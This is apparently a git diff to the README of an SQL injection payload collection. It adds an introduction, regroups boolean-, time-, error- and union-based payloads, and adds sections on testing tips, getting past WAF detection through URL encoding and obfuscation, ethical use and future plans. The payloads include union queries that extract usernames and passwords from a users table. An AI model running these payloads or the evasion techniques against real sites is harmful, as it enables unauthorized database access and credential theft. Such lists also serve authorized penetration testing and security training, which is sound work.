@@ -1,33 +1,51 @@
 # SQL Injection Payloads
 
-## Boolean-Based SQL Injection
-These payloads work by causing the SQL query to return a true or false value, allowing you to infer information about the database structure.
+## Introduction to SQL Injection
+SQL Injection (SQLi) is a type of attack on web applications that exploits weaknesses in how SQL queries are processed. By injecting malicious queries, an attacker can execute unwanted commands on the database, potentially compromising sensitive information.
 
+## Types of SQL Injection
+
+### Boolean-Based SQL Injection
+These payloads work by causing the SQL query to return a true or false value, allowing you to infer information about the database structure.
 - `' OR 1=1--`
 - `' OR 'x'='x`
 - `') OR ('1'='1`
 - `' OR 1=1#`
 
-## Time-Based SQL Injection
+### Time-Based SQL Injection
 These payloads use time delays to confirm if an SQL injection vulnerability exists. If the server responds after a noticeable delay, the vulnerability is confirmed.
-
 - `' OR IF(1=1, SLEEP(5), 0)--`
 - `' OR IF(1=1, SLEEP(10), 0)#`
 - `' OR 1=1 WAITFOR DELAY '0:0:5'--`
 
-## Error-Based SQL Injection
-These payloads are used to force the database to return error messages, which can reveal valuable information about the database structure.
-
+### Error-Based SQL Injection
+These payloads force the database to return error messages, which can reveal valuable information about the database structure.
 - `' AND 1=CONVERT(int, (SELECT @@version))--`
 - `' UNION SELECT NULL, NULL, NULL, version()--`
 - `' AND 1=1 GROUP BY CONCAT(username,0x3a,password)--`
 
-## Union-Based SQL Injection
+### Union-Based SQL Injection
 This type of SQLi allows you to combine the results of two or more queries.
-
 - `' UNION SELECT null, username, password FROM users--`
 - `' UNION SELECT 1, @@version--`
 - `' UNION SELECT null, null, user(), database()--`
+
+## Tips for Using the Payloads
+- **Test in Safe Environments**: Make sure to test the payloads in environments like **Hack The Box** or **TryHackMe**.
+- **Test All Variables**: Ensure you test every possible input type (GET, POST, etc.).
+- **Avoid Detection by WAF**: Some Web Application Firewalls (WAFs) may block certain payloads. Try changing the payload structure or using encoding.
+
+## How to Bypass Detection
+- **URL Encoding**: Use URL encoding to bypass WAF filters.
+  Example: `'%27%20OR%201%3D1--`
+- **Obfuscating Strings**: Use more complex strings or payloads that don't contain typical separators like `;`.
+
+## Ethical Use of Payloads
+These payloads should only be used to test systems that have been approved by the system owner. Ensure you have permission before running any of these payloads on live websites.
+
+## Future Projects
+- Add more payloads for **Blind SQLi**.
+- Improve payloads to work with different database types (MySQL, MSSQL, PostgreSQL, etc.).
 
 ## Tips for Usage
 - Replace `username`, `password`, or `version()` with actual column names when testing on a real site.
